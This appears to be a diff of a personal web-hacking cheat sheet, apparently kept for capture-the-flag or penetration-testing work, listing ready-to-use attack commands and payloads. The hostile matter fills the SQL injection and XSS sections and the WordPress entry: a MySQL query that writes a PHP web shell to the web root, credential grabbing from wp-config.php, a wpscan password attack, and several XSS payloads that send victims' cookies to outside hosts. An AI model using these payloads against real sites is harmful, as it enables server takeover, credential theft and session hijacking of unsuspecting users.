@@ -1,7 +1,7 @@
 ####Web Hacking
 
 ##Directory Busting
-Gobuster----gobuster dir -u &lt;ip&gt; -w /usr/share/dirb/wordlists/big.txt
+Gobuster----gobuster dir -u <ip> -w /usr/share/dirb/wordlists/big.txt
 Dirbuster----dirb http://target/directory/ /usr/share/dirb/wordlists/common.txt
 Find Parameters Wordlists----find . | grep -i param
 Bust Parameter Names----wfuzz --hw 0 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://target.com/shell.php?FUZZ=id
@@ -13,9 +13,9 @@ Wfuzz Subdomain Enumeration----wfuzz --hl 107 -u http://10.10.116.180 -H "Host: 
 List of Windows Files----<a href="http://pwnwiki.io/?_escaped_fragment_=presence/windows/blind.md#!presence/windows/blind.md">Windows Blind Files</a>
 
 ##SQL Injection
-Basic sqlmap----sqlmap -u &lt;target-url&gt;
-sqlmap maximum risk & specify DBMS----sqlmap -u &lt;target-url&gt; --DBMS=MSSQL 
-MySQL (Inject malicious PHP code into file)----SELECT '&lt;?php passthru($_GET[cmd])?&gt;' INTO OUTFILE '/var/www/cmd.php'
+Basic sqlmap----sqlmap -u <target-url>
+sqlmap maximum risk & specify DBMS----sqlmap -u <target-url> --DBMS=MSSQL 
+MySQL (Inject malicious PHP code into file)----SELECT '<?php passthru($_GET[cmd])?>' INTO OUTFILE '/var/www/cmd.php'
 Sqlite (Into Outfile equivalent)----"""ATTACH DATABASE '/home/devnull/public_html/test.php' as pwn;
 	CREATE TABLE pwn.shell (code TEXT);
 	INSERT INTO pwn.shell (code) VALUES ("test");"""
@@ -25,23 +25,23 @@ Allow login for user externally----
 
 
 ##Odds & Ends
-FireFox Browse Nonstandard Ports----about:config -- network.security.ports.banned.override (String &lt;port-num&gt;)
+FireFox Browse Nonstandard Ports----about:config -- network.security.ports.banned.override (String <port-num>)
 
-Webdav----sudo mount -t davfs http://&lt;target-server&gt;:&lt;port&gt; /mnt/webdav
+Webdav----sudo mount -t davfs http://<target-server>:<port> /mnt/webdav
 
 ##Wordpress
 Post-Exploitation----Database credentials located in wp-config.php (cat wp-config.php | grep DB_)
-Wordpress Scan----wpscan --url &lt;domain&gt;  -e ap,at,u,cb,dbe --password-attack 
+Wordpress Scan----wpscan --url <domain>  -e ap,at,u,cb,dbe --password-attack 
 xmlrpc -P /usr/share/wordlists/fasttrack.txt -o wpscan.txt
 
 ##XSS
-SVG - No spaces----&lt;svg/OnLoad="`${prompt``}`"&gt;
-Cookie Stealing----&lt;script&gt;document.write('&lt;img src="https://www.hooperlabs.xyz/cookie?' + document.cookie + '"&gt;')&lt;/script&gt;
-Cookie Stealing----&lt;iframe src=http://10.2.188.2 onload="this.src='http://10.2.188.2?' + document.cookie"&gt;
+SVG - No spaces----<svg/OnLoad="`${prompt``}`">
+Cookie Stealing----<script>document.write('<img src="https://www.hooperlabs.xyz/cookie?' + document.cookie + '">')</script>
+Cookie Stealing----<iframe src=http://10.2.188.2 onload="this.src='http://10.2.188.2?' + document.cookie">
 
 XSS Web Request----http://challenge.acictf.com:61470/search?search=foo&foobarh00p%3Csvg//onload%3d%22alert(1)%22%3E=%3Cscript%3E
-SVG - No spaces----&lt;svg/OnLoad="`${prompt``}`"&gt;
-Cookie Stealing----&lt;script&gt;document.write('&lt;img src="https://www.hooperlabs.xyz/cookie?' + document.cookie + '"&gt;')&lt;/script&gt;
+SVG - No spaces----<svg/OnLoad="`${prompt``}`">
+Cookie Stealing----<script>document.write('<img src="https://www.hooperlabs.xyz/cookie?' + document.cookie + '">')</script>
 Cookie Stealing (with img)----function addImage(){var img = document.createElement('img');img.src = 'https://www.hooperlabs.xyz/' + document.cookie; document.body.appendChild(img);}; addImage();
 Update Cookie within Browser----javascript:void(document.cookie="myCookie=thisismystolencookie");
 
